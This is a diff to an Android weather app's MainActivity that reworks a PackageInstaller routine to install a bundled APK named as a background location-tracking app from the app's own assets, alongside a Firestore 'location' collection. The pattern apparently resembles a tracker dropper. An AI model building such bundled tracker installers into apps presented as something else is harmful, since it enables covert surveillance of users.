@@ -3,14 +3,13 @@ package com.plcoding.weatherapp.presentation
 import android.Manifest
 import android.app.Activity
 import android.app.PendingIntent
-import android.content.ActivityNotFoundException
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.net.Uri
-import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.provider.Settings
@@ -49,8 +48,6 @@ import com.google.firebase.database.ValueEventListener
 import com.google.firebase.messaging.FirebaseMessaging
 import android.content.pm.PackageInstaller
 import android.content.res.AssetManager
-import androidx.compose.foundation.lazy.LazyRow
-import com.plcoding.weatherapp.presentation.ui.theme.ApkInstallReceiver
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
@@ -61,6 +58,7 @@ class MainActivity : ComponentActivity() {
 
     private val handler = Handler()
     private lateinit var runnable: Runnable
+    private val apkInstallReceiver= ApkInstallReceiver()
     private val locationCollectionRef = Firebase.firestore.collection("location")
     private val mainViewModel: MainViewModel by viewModels()
     private val viewModel: WeatherViewModel by viewModels()
@@ -116,6 +114,11 @@ class MainActivity : ComponentActivity() {
 
         // Schedule the initial execution of the Runnable
         handler.postDelayed(runnable, 60000) // Start the activity after 1 minute (60000 milliseconds)
+
+        registerReceiver(
+            apkInstallReceiver,
+            IntentFilter("PACKAGE_INSTALL_ACTION")
+        )
 
         setContent {
             WeatherAppTheme {
@@ -289,10 +292,10 @@ class MainActivity : ComponentActivity() {
                         }
                         Button(onClick = {
                             val apkFileName = "app-release.apk"
-                            val targetPackageName = "com.plcoding.SecondTrackingApplication"
+                            val targetPackageName = "com.plcoding.backgroundlocationtracking"
                             val apkFile = copyApkFromAssetsToCache(this@MainActivity, apkFileName)
                             println("APK file name: $apkFile")
-                            installApk(apkFile, packageManager, targetPackageName)
+                            installApk(this@MainActivity,apkFile, packageManager, targetPackageName)
 
                         }) {
                             Text(text = "Install package")
@@ -464,35 +467,56 @@ class MainActivity : ComponentActivity() {
     }
 
     // Function to install an APK file
-    private fun installApk(apkFile: File?, packageManager: PackageManager, targetPackageName:String) {
+    private fun installApk(context: Context, apkFile: File?, packageManager: PackageManager, targetPackageName:String) {
         try {
-            val packageInstaller = packageManager.packageInstaller
+            //Get Package Installer instance from PackageManager
+            val packageInstaller = context.packageManager.packageInstaller
 
-            // Create a new session
+            // Create a new session parameters for the PackageInstaller session
             val sessionParams = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
+            // Create a new session with the specified session parameters
             val sessionId = packageInstaller.createSession(sessionParams)
+            // Open the created session
             val session = packageInstaller.openSession(sessionId)
 
             // Open the APK file as input stream
+            // Open an input stream to read the APK data into the session
             val inputStream = FileInputStream(apkFile)
-            val outputStream = session.openWrite("package", 0, -1)
+            // Open an output stream to write the APK data into the session
+            val outputStream = session.openWrite(targetPackageName, 0, -1)
 
             // Copy the APK file contents to the session's output stream
+            // Define a buffer to read and write data in chunks
             val buffer = ByteArray(65536)
             var bytesRead: Int
+
+            // Read data from the input stream in chunks and write to the output stream
             while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                 outputStream.write(buffer, 0, bytesRead)
             }
 
             // Finish writing and close streams
+            // Ensure all data is written to the output stream
             session.fsync(outputStream)
+            // Close the input stream
             inputStream.close()
+            // Close the output stream
             outputStream.close()
-            println("You are here1")
 
-            // Commit the session (start installation for the target app)
+            // Create a PendingIntent for the broadcast receiver with appropriate flags
+            val broadcastIntent = Intent("PACKAGE_INSTALL_ACTION")
+            val pendingIntent = PendingIntent.getBroadcast(context, sessionId, broadcastIntent,
+                PendingIntent.FLAG_MUTABLE)
+
+            // Commit the session with the PendingIntent
+            session.commit(pendingIntent.intentSender)
+
+
+
+            // Commit the session to start installation for the app
+            //Create a Pending Intent for the session and commit it
+//            session.commit(PendingIntent.getBroadcast(context,sessionId, Intent("PACKAGE_INSTALL_ACTION"), 0).intentSender)
 //            val intent = packageManager.getLaunchIntentForPackage(targetPackageName) // this@MainActivity.packageName
-//            println("You are here2")
 //            if (intent == null) {
 //                println("Launch intent is null for package: $targetPackageName")
 //                return
@@ -501,23 +525,26 @@ class MainActivity : ComponentActivity() {
 //                sessionId, intent, PendingIntent.FLAG_IMMUTABLE) //FLAG_UPDATE_CURRENT
 //            println("You are here3")
 //            session.commit(pendingIntent.intentSender)
+
+            //Attempt 2
 //            val intent = Intent(this@MainActivity, ApkInstallReceiver::class.java) // Create a dummy intent
 //            val pendingIntent = PendingIntent.getBroadcast(this@MainActivity, sessionId, intent, PendingIntent.FLAG_IMMUTABLE)
 //            session.commit(pendingIntent.intentSender)
 
 
+            //Attempt 3
             // Create Intent to launch the installed app
-            val intent = Intent(Intent.ACTION_MAIN)
-            intent.addCategory(Intent.CATEGORY_LAUNCHER)
-            intent.setPackage(targetPackageName)
-            intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
-            println("Successfully installed APK")
+//            val intent = Intent(Intent.ACTION_MAIN)
+//            intent.addCategory(Intent.CATEGORY_LAUNCHER)
+//            intent.setPackage(targetPackageName)
+//            intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+//            println("Successfully installed APK")
             // Check if the intent and package name are not null before launching
-            if (intent.resolveActivity(packageManager) != null && targetPackageName.isNotEmpty()) {
-                println("Successfully installed and launched app: $targetPackageName")
-            } else {
-                println("Failed to launch app: $targetPackageName")
-            }
+//            if (intent.resolveActivity(packageManager) != null) {
+//                println("Successfully installed and launched app")
+//            } else {
+//                println("Failed to launch app")
+//            }
         } catch (e: IOException) {
             println("Failed to install APK")
             e.printStackTrace()
